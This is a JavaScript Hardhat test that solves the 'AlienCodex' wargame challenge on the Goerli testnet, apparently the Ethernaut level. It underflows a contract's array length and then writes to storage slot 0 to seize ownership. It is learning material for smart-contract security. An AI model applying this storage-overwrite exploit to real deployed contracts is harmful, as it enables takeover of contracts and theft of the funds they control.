const { expect } = require("chai");
const { ethers } = require("hardhat");
const { api_key, } = require('../secrets.json');

describe("AlienCodex", function () {
	let contract, provider, first_account;
	let target_address = false;

	beforeEach(async function () {
		target_address = "0x0A7227BDF3E5e715556af8d7Cfdf46E1eaB1C955";
		[first_account] = await ethers.getSigners();
		if (target_address) {
			contract = await ethers.getContractAt("AlienCodex", target_address);
			provider = new ethers.providers.AlchemyProvider(network="goerli", api_key);
		} else {
			const AlienCodex = await ethers.getContractFactory("AlienCodex");
			contract = await AlienCodex.deploy();
			target_address = contract.address;
			provider = new ethers.providers.getDefaultProvider("http:/\/localhost:8545");
		}
		console.log("Contract address: ", target_address);
	});

	it("Ataque", async function () {
        var data;

		let tx = await contract.make_contact();
		// force overflow, open up the array to access all the contract's storage
		tx = await contract.retract();

        console.log("Logging stored memory on the contract");
        for (let i = 0; i < 2; i++) {
            data = await provider.getStorageAt(target_address, i);
            console.log(i, data);
        }

		// get first slot index of the storage for the array
		const abi = ethers.utils.defaultAbiCoder;
		let array_first_slot_index = ethers.utils.keccak256(abi.encode(["uint256"],[1]));
		// move it towards the first slot of the contract's storage
		// to do that, remove first_slot_index amount from the length of the array, since it is all stored contiguously
		let remaining_to_first_slot_storage = BigInt(2**256) - BigInt(array_first_slot_index);
		console.log(remaining_to_first_slot_storage);

		// write the address of the first account into the first slot of the contract's storage (owner)
		tx = await contract.revise(remaining_to_first_slot_storage, abi.encode(["uint256"], [first_account.address]));
		await tx.wait();
		
		for (let i = 0; i < 2; i++) {
            data = await provider.getStorageAt(target_address, i);
            console.log(i, data);
        }

		expect(await contract.owner()).to.equal(first_account.address);
	});

	afterEach(async function() {
		// COMPLETAR
	});
});
